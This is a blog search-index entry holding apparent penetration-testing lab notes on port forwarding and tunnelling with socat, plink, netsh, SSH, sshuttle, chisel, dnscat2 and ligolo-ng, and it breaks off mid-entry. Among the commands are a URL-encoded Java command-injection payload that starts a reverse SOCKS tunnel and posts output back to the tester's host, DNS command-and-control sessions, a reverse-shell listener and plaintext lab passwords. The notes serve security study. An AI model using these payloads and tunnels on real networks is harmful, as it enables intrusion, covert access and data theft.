<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Port redirection &amp;&amp; Tunnel</title>
    <link href="/Port-redirection-Tunnel/"/>
    <url>/Port-redirection-Tunnel/</url>
    
    <content type="html"><![CDATA[<h1 id="Port-Redirection"><a href="#Port-Redirection" class="headerlink" title="Port Redirection"></a>Port Redirection</h1><h2 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22<br></code></pre></td></tr></table></figure><ul><li><code>TCP-LISTEN</code> set listen tcp port</li><li><code>fork</code> when receive a tcp,fork a new process,not die</li><li><code>TCP:10.4.50.215:22</code> set redirection target</li><li><code>-ddd</code> set verbose output,debug</li></ul><h2 id="ssh-exe-windows"><a href="#ssh-exe-windows" class="headerlink" title="ssh.exe(windows)"></a>ssh.exe(windows)</h2><p>the version of openssh&gt;=7.6</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ssh <span class="hljs-literal">-N</span> <span class="hljs-literal">-R</span> <span class="hljs-number">9998</span> kali@<span class="hljs-number">192.168</span>.<span class="hljs-number">118.4</span><br></code></pre></td></tr></table></figure><p>also edit conf of proxychains and use proxychains</p><h2 id="plink-exe-windows"><a href="#plink-exe-windows" class="headerlink" title="plink.exe(windows)"></a>plink.exe(windows)</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Windows\Temp\plink.exe <span class="hljs-literal">-ssh</span> <span class="hljs-literal">-l</span> kali <span class="hljs-literal">-pw</span> &lt;YOUR PASSWORD HERE&gt; <span class="hljs-literal">-R</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9833</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">3389</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">118.4</span><br></code></pre></td></tr></table></figure><ul><li><code>-l</code> set user</li><li><code>-pw</code> set passwd </li><li><code>-R</code> <code>listen_socket:forward_socket</code> first <code>127.0.0.1</code> mean the ssh target loop address,second <code>127.0.0.1</code> mean the local machine loop address<br>or<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">cmd.exe /c <span class="hljs-built_in">echo</span> y | .\plink.exe <span class="hljs-literal">-ssh</span> <span class="hljs-literal">-l</span> kali <span class="hljs-literal">-pw</span> &lt;YOUR PASSWORD HERE&gt; <span class="hljs-literal">-R</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9833</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">3389</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">41.7</span><br></code></pre></td></tr></table></figure>and we could connect to the machine port<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833<br></code></pre></td></tr></table></figure><h2 id="netsh-windows"><a href="#netsh-windows" class="headerlink" title="netsh(windows)"></a>netsh(windows)</h2>it need administrator privilege<br>use <strong>netsh interface</strong> to add a portproxy rule<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">netsh interface portproxy add v4tov4 listenport=<span class="hljs-number">2222</span> listenaddress=<span class="hljs-number">192.168</span>.<span class="hljs-number">50.64</span> connectport=<span class="hljs-number">22</span> connectaddress=<span class="hljs-number">10.4</span>.<span class="hljs-number">50.215</span><br></code></pre></td></tr></table></figure></li><li><code>v4tov4</code> ipv4</li><li><code>listenport</code> <code>listenaddress</code> set listen socket</li><li><code>connectport</code> <code>connectaddress</code> set forward socket<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">netsh interface portproxy show all<br></code></pre></td></tr></table></figure>check the port forward if stored<br>but the firewalld still ban the port<br>use <strong>netsh advfirewall firewall</strong> to add rule<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">netsh advfirewall firewall add rule name=<span class="hljs-string">&quot;port_forward_ssh_2222&quot;</span> protocol=TCP <span class="hljs-built_in">dir</span>=<span class="hljs-keyword">in</span> localip=<span class="hljs-number">192.168</span>.<span class="hljs-number">50.64</span> localport=<span class="hljs-number">2222</span> action=allow<br></code></pre></td></tr></table></figure></li><li><code>name=</code> set rule name</li><li><code>protocol</code> allow TCP protocol</li><li><code>dir</code> set direction</li><li><code>localip</code> <code>localport</code> <code>action</code> allow use tcp protocol to connect in localip and localport,especially for inbound</li></ul><h1 id="Tunnel"><a href="#Tunnel" class="headerlink" title="Tunnel"></a>Tunnel</h1><p>Tunnel wrap a protocol in another data stream when transport<br>no firewalld</p><p>normal user only listen port&gt;1024!!!</p><h2 id="ssh-tunnel"><a href="#ssh-tunnel" class="headerlink" title="ssh tunnel"></a>ssh tunnel</h2><p>if u dont have pty shell,spawn a pty by python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="ssh-local-port-forward"><a href="#ssh-local-port-forward" class="headerlink" title="ssh local port forward"></a>ssh local port forward</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs network">|   |   |   |<br>A   B   C   D<br>A B contact<br>B C contact<br>C D contact<br></code></pre></td></tr></table></figure><p>B make a ssh tunnel to C and the ssh tunnel will forward data to D</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215<br></code></pre></td></tr></table></figure><ul><li><code>-N</code> no shell,ban excute any command</li><li><code>-L</code> set local port forward<ul><li><code>IPADDRESS:PORT:IPADDRESS:PORT</code> first socket was the set the listen socket as the ssh client, second socket was the target that we will forward data</li></ul></li><li><code>-v</code> if there was error,use <code>-v</code> to debug</li></ul><h3 id="ssh-dynamic-port-forward"><a href="#ssh-dynamic-port-forward" class="headerlink" title="ssh dynamic port forward"></a>ssh dynamic port forward</h3><p>forward dynamic port</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215<br></code></pre></td></tr></table></figure><ul><li><code>-D</code> set dynamic port forward.set we want to bind socket.<code>ip:port</code></li></ul><p>and we need change proxychains file</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tail</span> /etc/proxychains4.conf<br><span class="hljs-comment">#       proxy types: http, socks4, socks5, raw</span><br><span class="hljs-comment">#         * raw: The traffic is simply forwarded to the proxy without modification.</span><br><span class="hljs-comment">#        ( auth types supported: &quot;basic&quot;-http  &quot;user/pass&quot;-socks )</span><br><span class="hljs-comment">#</span><br>[ProxyList]<br><span class="hljs-comment"># add proxy here ...</span><br><span class="hljs-comment"># meanwile</span><br><span class="hljs-comment"># defaults set to &quot;tor&quot;</span><br>socks5 192.168.50.63 9999<span class="hljs-comment">#the ip that start dynamic port forward</span><br></code></pre></td></tr></table></figure><p>we can excute nmap scan.<br>nmap scan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains nmap -vvv -sT -p 4800-4900 -Pn 172.16.226.217 -n<br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.16<br>Host discovery disabled (-Pn). All addresses will be marked <span class="hljs-string">&#x27;up&#x27;</span> and scan <span class="hljs-built_in">times</span> may be slower.<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-23 12:23 CST<br>Initiating Connect Scan at 12:23<br>Scanning 172.16.226.217 [101 ports]<br>[proxychains] Strict chain  ...  192.168.226.63:9999  ...  172.16.226.217:4858 &lt;--socket error or <span class="hljs-built_in">timeout</span>!<br>[proxychains] Strict chain  ...  192.168.226.63:9999  ...  172.16.226.217:4897 &lt;--socket error or <span class="hljs-built_in">timeout</span>!<br>adjust_timeouts2: packet supposedly had rtt of 15589634 microseconds.  Ignoring time.<br>adjust_timeouts2: packet supposedly had rtt of 15589634 microseconds.  Ignoring time.<br>Connect Scan Timing: About 1.98% <span class="hljs-keyword">done</span>; ETC: 12:49 (0:25:35 remaining)<br>[proxychains] Strict chain  ...  192.168.226.63:9999  ...  172.16.226.217:4849 &lt;--socket error or <span class="hljs-built_in">timeout</span>!<br>adjust_timeouts2: packet supposedly had rtt of 15671333 microseconds.  Ignoring time.<br>adjust_timeouts2: packet supposedly had rtt of 15671333 microseconds.  Ignoring time.<br><br></code></pre></td></tr></table></figure><ul><li><code>-vvv</code> verbose output</li><li><code>-n</code> forbid dns analyze(<em>important</em>)</li><li><code>-Pn</code> forbid host discovery(<em>important</em>)<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo proxychains nmap -vvv -sS -p 4872 172.16.226.217 -n -Pn<br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.16<br>Host discovery disabled (-Pn). All addresses will be marked <span class="hljs-string">&#x27;up&#x27;</span> and scan <span class="hljs-built_in">times</span> may be slower.<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-23 12:40 CST<br>Initiating SYN Stealth Scan at 12:40<br>Scanning 172.16.226.217 [1 port]<br>Completed SYN Stealth Scan at 12:40, 2.02s elapsed (1 total ports)<br>Nmap scan report <span class="hljs-keyword">for</span> 172.16.226.217<br>Host is up, received user-set.<br>Scanned at 2024-01-23 12:40:42 CST <span class="hljs-keyword">for</span> 2s<br><br>PORT     STATE    SERVICE REASON<br>4872/tcp filtered unknown no-response<br><br>Read data files from: /usr/bin/../share/nmap<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.09 seconds<br>           Raw packets sent: 2 (88B) | Rcvd: 0 (0B)<br></code></pre></td></tr></table></figure>if u cant connect the host directly,<code>-Pn</code> and <code>-n</code> was necessary<br>SYN scan sometime will have some defect. it’s better to spend more time to excute TCP scan</li></ul><p><em>just always remember that when you use a SOCK5 proxy, ping and stealth scans will NEVER go through the tunnel. It is just how it works. You’ll need to do full TCP scans with nmap to get results.<br>SOCKS doens’t support ping/UDP in most methods but there are strange edge cases but typically there is no protocol support for it</em></p><h3 id="ssh-remote-port-forward"><a href="#ssh-remote-port-forward" class="headerlink" title="ssh remote port forward"></a>ssh remote port forward</h3><p>if the firewalld stop any local port listen,we could use remote port forward</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 rightevil@192.168.118.4<br></code></pre></td></tr></table></figure><ul><li><code>-R</code> set remote port forward.<code>listen_socket:forward_socket</code>.the listen set the socket u listen. the forward set the forward target.</li></ul><p>u can connect the target port by u local port</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">psql -h 127.0.0.1 -p 2345 -U postgres<br></code></pre></td></tr></table></figure><h3 id="ssh-dynamic-remote-port-forward"><a href="#ssh-dynamic-remote-port-forward" class="headerlink" title="ssh dynamic remote port forward"></a>ssh dynamic remote port forward</h3><p>remote port + dynamic port forward</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -N -R 9998 kali@192.168.118.4<br></code></pre></td></tr></table></figure><p><code>listen_socket</code>.if u dont set the ip,the default was <code>127.0.0.1</code><br>u need to edit the conf file of proxychains</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali@kali:~$ <span class="hljs-built_in">tail</span> /etc/proxychains4.conf<br><span class="hljs-comment">#       proxy types: http, socks4, socks5, raw</span><br><span class="hljs-comment">#         * raw: The traffic is simply forwarded to the proxy without modification.</span><br><span class="hljs-comment">#        ( auth types supported: &quot;basic&quot;-http  &quot;user/pass&quot;-socks )</span><br><span class="hljs-comment">#</span><br>[ProxyList]<br><span class="hljs-comment"># add proxy here ...</span><br><span class="hljs-comment"># meanwile</span><br><span class="hljs-comment"># defaults set to &quot;tor&quot;</span><br>socks5 127.0.0.1 9998<br></code></pre></td></tr></table></figure><p>dynamic port forward need use <code>proxychains</code><br>eg:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64<br></code></pre></td></tr></table></figure><h3 id="sshuttle-tunnel"><a href="#sshuttle-tunnel" class="headerlink" title="sshuttle tunnel"></a>sshuttle tunnel</h3><p>sshuttle like a VPN,it need the root of ssh client,python3 of ssh server<br>if we connect to a machine by ssh. we are ssh client,he was the ssh server<br>the machine need to start port forward</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22<br></code></pre></td></tr></table></figure><p>and we strat a ssh tunnel by sshuttle to the target subnet</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24<br></code></pre></td></tr></table></figure><p>set the string of ssh socket<br>final we could connect to the target directly</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234<br></code></pre></td></tr></table></figure><h2 id="http-tunnel"><a href="#http-tunnel" class="headerlink" title="http tunnel"></a>http tunnel</h2><p>if <em>Deep Packet Inspection</em> forbid all packet except http(we could use wget and curl)</p><h3 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h3><p><em>sockes</em><br>make sure the version match<br>reverse port forward(like ssh remote port forward)<br>start chisel server in our machine</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel server --port 8080 --reverse<br></code></pre></td></tr></table></figure><p>if excute command by curl<br>payload</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/tmp/</span>chisel client <span class="hljs-number">192.168</span>.<span class="hljs-number">45.153</span>:<span class="hljs-number">8080</span> R:socks &gt; <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> &amp;<br></code></pre></td></tr></table></figure><ul><li><code>server socket</code></li><li><code>R:socks</code> reverse socks tunnel(default port 1080)</li><li><code>&gt; /dev/null 2&gt;&amp;1 &amp;</code> other shell redirect to null,and it will excute background,our command injection would’nt wait for process finish</li></ul><p>debug<br>payload in curl</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/tmp/chisel client 192.168.118.4:8080 R:socks &amp;&gt; /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/<br></code></pre></td></tr></table></figure><p>read /tmp/output and return to our 8080</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.<span class="hljs-built_in">eval</span>%28%22new%20java.lang.ProcessBuilder%28%29.<span class="hljs-built_in">command</span>%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.118.4:8080/%27%29.start%28%29%22%29%7D/<br></code></pre></td></tr></table></figure><p>if connect successfully</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali@kali:~$ chisel server --port 8080 --reverse<br>2023/10/03 15:57:53 server: Reverse tunnelling enabled<br>2023/10/03 15:57:53 server: Fingerprint Pru+AFGOUxnEXyK1Z14RMqeiTaCdmX6j4zsa9S2Lx7c=<br>2023/10/03 15:57:53 server: Listening on http://0.0.0.0:8080<br>2023/10/03 18:13:54 server: session<span class="hljs-comment">#2: Client version (1.8.1) differs from server version (1.8.1-0kali2)</span><br>2023/10/03 18:13:54 server: session<span class="hljs-comment">#2: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening</span><br></code></pre></td></tr></table></figure><p>we could use proxychains or ncat in ssh<br>ssh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -o ProxyCommand=<span class="hljs-string">&#x27;ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p&#x27;</span> database_admin@10.4.50.215<br></code></pre></td></tr></table></figure><ul><li><code>%h</code> <code>%p</code> for the host and port<br>or<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains <span class="hljs-built_in">command</span><br></code></pre></td></tr></table></figure>nmap scan<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo proxychains nmap -vvv -sT -Pn --top-ports 100 10.4.213.64<br></code></pre></td></tr></table></figure><h2 id="dns-tunnel"><a href="#dns-tunnel" class="headerlink" title="dns tunnel"></a>dns tunnel</h2><h3 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h3>dnscat2 server will excute in a special domain in our machine,client will excute in the zombine machine<br>server<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali@felineauthority:~$ dnscat2-server feline.corp<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>New window created: 0<br>New window created: crypto-debug<br>Welcome to dnscat2! Some documentation may be out of <span class="hljs-built_in">date</span>.<br><br>auto_attach =&gt; <span class="hljs-literal">false</span><br>history_size (<span class="hljs-keyword">for</span> new windows) =&gt; 1000<br>Security policy changed: All connections must be encrypted<br>New window created: dns1<br>Starting Dnscat2 DNS server on 0.0.0.0:53<br>[domains = feline.corp]...<br><br>Assuming you have an authoritative DNS server, you can run<br>the client anywhere with the following (--secret is optional):<br><br>  ./dnscat --secret=7a87a5d0a8480b080896606df6b63944 feline.corp<br><br>To talk directly to the server without a domain name, run:<br><br>  ./dnscat --dns server=x.x.x.x,port=53 --secret=7a87a5d0a8480b080896606df6b63944<br><br>Of course, you have to figure out &lt;server&gt; yourself! Clients<br>will connect directly on UDP port 53.<br><br>dnscat2&gt; New window created: 1<br>Session 1 security: ENCRYPTED BUT *NOT* VALIDATED<br>For added security, please ensure the client displays the same string:<br><br>&gt;&gt; Annoy Mona Spiced Outran Stump Visas<br><br>dnscat2&gt;<br></code></pre></td></tr></table></figure>client<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns">database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp<br>Creating DNS driver:<br> domain = feline.corp<br> host   = <span class="hljs-number">0.0.0.0</span><br> port   = <span class="hljs-number">53</span><br> type   = <span class="hljs-keyword">TXT</span>,<span class="hljs-keyword">CNAME</span>,<span class="hljs-keyword">MX</span><br> server = <span class="hljs-number">127.0.0.53</span><br><br>Encrypted session established! For added security, please verify the server also displays this string:<br><br>Annoy Mona Spiced Outran Stump Visas <br><br>Session established!<br></code></pre></td></tr></table></figure>dnscat<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#list all active windows</span><br>windows<br><span class="hljs-comment">#user windows 1</span><br>window -i 1<br><span class="hljs-comment">#listen like ssh local listen</span><br>listen 127.0.0.1:4455 172.16.2.11:445<br></code></pre></td></tr></table></figure><code>local socket</code> <code>remote socket</code><br>i think use local ip not loop ip will better</li></ul><h1 id="recommended-tools"><a href="#recommended-tools" class="headerlink" title="recommended tools"></a>recommended tools</h1><h2 id="ligolo-ng"><a href="#ligolo-ng" class="headerlink" title="ligolo-ng"></a>ligolo-ng</h2><p>It’s convenient when pivot network and excute nmap scan.And it could receive reverse shell and download file by webserver from kali.<br>first init:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kali">sudo ip tuntap add user rightevil mode tun ligolo<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kali">sudo ip link set ligolo up<br></code></pre></td></tr></table></figure><p>start in kali</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kali">./proxy -selfcert<br></code></pre></td></tr></table></figure><p>agent connect<br><em>windows</em></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\agent.exe <span class="hljs-literal">-connect</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">45.248</span>:<span class="hljs-number">11601</span> <span class="hljs-literal">-ignore-cert</span><br></code></pre></td></tr></table></figure><p><em>linux</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./agent -connect 192.168.45.153:11601 -ignore-cert<br></code></pre></td></tr></table></figure><p>choose session</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">session<br></code></pre></td></tr></table></figure><p>enum interface</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ifconfig<br></code></pre></td></tr></table></figure><p>add innet </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kali">sudo ip route add 172.16.216.0/24 dev ligolo<br></code></pre></td></tr></table></figure><p>choose session and start tunnel connect</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">session<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">start<br></code></pre></td></tr></table></figure><p>start scan directly</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sn 172.16.1.0/24<br></code></pre></td></tr></table></figure><p>set listener(capture reverse shell and transfer file)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">listener_add --addr 0.0.0.0:81 --to 127.0.0.1:80<br></code></pre></td></tr></table></figure><p>list listener</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">listener_list<br></code></pre></td></tr></table></figure><h2 id="chisel-1"><a href="#chisel-1" class="headerlink" title="chisel"></a>chisel</h2><p>!!!important!!!<br>the client and server version should be the same<br>it cant listen reverse shell in innet network!!!</p><p>Because of his niche, he is sometimes not discovered or blocked by firewalls etc.<br>but it spend more time when excute nmap scan,cause socks proxy just support TCP scan.and chisel cant receive reverse shell.</p><h3 id="socks-proxy"><a href="#socks-proxy" class="headerlink" title="socks proxy"></a>socks proxy</h3><p>kali:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel server --port 8080 --reverse<br></code></pre></td></tr></table></figure><p>target:<br>run in background</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Start-Job</span> <span class="hljs-literal">-ScriptBlock</span> &#123; c:\my\chisel.exe client <span class="hljs-number">192.168</span>.<span class="hljs-number">45.223</span>:<span class="hljs-number">8080</span> <span class="hljs-built_in">R</span>:socks &#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/tmp/chisel client 192.168.45.153:8080 R:socks &gt; /dev/null 2&gt;&amp;1 &amp;<br></code></pre></td></tr></table></figure><p>just run</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">c:\my\chisel.exe client <span class="hljs-number">192.168</span>.<span class="hljs-number">45.223</span>:<span class="hljs-number">8080</span> <span class="hljs-built_in">R</span>:socks<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/tmp/chisel client 192.168.45.153:8080 R:socks<br></code></pre></td></tr></table></figure><p>then use proxy to excute command to communicate with innet network</p><h3 id="port-forward"><a href="#port-forward" class="headerlink" title="port forward"></a>port forward</h3><p>revserse mode: share <code>remote:port</code> from client to server’s <code>local:port</code><br>strict mode: share <code>remote:port</code> from server to client’s <code>local:port</code><br>Backward joins are more common than forward joins. Because the firewall will prevent us from actively connecting to the target<br>server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel server --port 8080 --reverse<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">chisel.exe server <span class="hljs-literal">--port</span> <span class="hljs-number">8080</span> <span class="hljs-literal">--reverse</span><br></code></pre></td></tr></table></figure><p>client:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 